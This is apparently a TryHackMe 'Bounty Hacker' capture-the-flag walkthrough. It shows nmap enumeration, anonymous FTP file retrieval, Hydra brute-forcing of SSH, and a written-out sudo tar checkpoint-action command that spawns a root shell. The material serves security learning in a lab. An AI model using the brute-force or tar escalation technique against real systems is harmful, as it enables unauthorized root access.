#     Bounty Hacker Walkthrough - Try Hack Me
![](https://i.imgur.com/wYxDzuh.jpg)

```You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! ```
> **Task 1:** Living up to the title.
## Enumaration
### Nmap
```
┌─[r00t@parrot]─[~/THM]
└──╼ $sudo nmap -sC -sT -sV -A 10.10.7.209
[sudo] password for r00t: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-14 16:03 EAT
Nmap scan report for 10.10.7.209
Host is up (0.25s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.119.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Ubiquiti AirOS 5.5.9 (90%), Linux 5.0 - 5.4 (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%), Linux 2.6.32 (89%), Linux 2.6.32 - 3.1 (89%), Linux 3.7 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   277.97 ms 10.18.0.1
2   279.74 ms 10.10.7.209

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.68 seconds
```

We found three ports open that is port 21, 22 and 80.

For us to answer ```
Who wrote the task list? ``` We will have to connect to the system using FTP since it allows anonymous connections.

> NB: FTP is used to transfer files in a network between the client and server
# FTP Exploitation

![](https://i.imgur.com/aCo2qG6.png)

As we can see, we have access to our FTP. We can try and see what file are here using ```ls.```

![](https://i.imgur.com/YOAUOMY.png)

We see, there are two files. To get them in my machine, I will use ```get filename```

![](https://i.imgur.com/uWSUoMS.png)

Now I can exit and read the files downloaded and try to answer the question ```Who wrote the task list?``` 

![](https://i.imgur.com/vr9AJja.png)

As we can see, the author is ```-lin```

Next, we now answer the question ```What service can you bruteforce with the text file found?```
**Ans:** SSH
 
Next, is to get the ```user password```. We will use ```Hydra```, to bruteforce the ssh creds and have the file ```locks.txt``` as our wordlist.

![](https://i.imgur.com/zeb95pD.png)

# Gaining User
We now have the user password, we can now ssh into the target.

![](https://i.imgur.com/EOhjo9j.png)

I have successfully connected to the target.


Now, I can have ```user.txt```

![](https://i.imgur.com/Q4LzNvm.png)

Yaay we got user.

# Privilege Escalation
We can check what service we can run as super user using ``` sudo -l```
![](https://i.imgur.com/NgdoZdY.png)
Now as you can see, we have permission of tar as root.

After a little bit of research and googling, i found some exploit from [gtfoibins](https://gtfobins.github.io/gtfobins/tar/) on tar escalation

```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```

Using the exploit as root, Boom! we get root

![](https://i.imgur.com/gCkBlN3.png)

Now we can successfully get ```root.txt```

![](https://i.imgur.com/OFno54O.png)

Congratulantions , finally we solved the lab and thank you so much for your time, if you liked this writeup and you feel it’s helpful then please share it with your friends. 
Happy hacking!

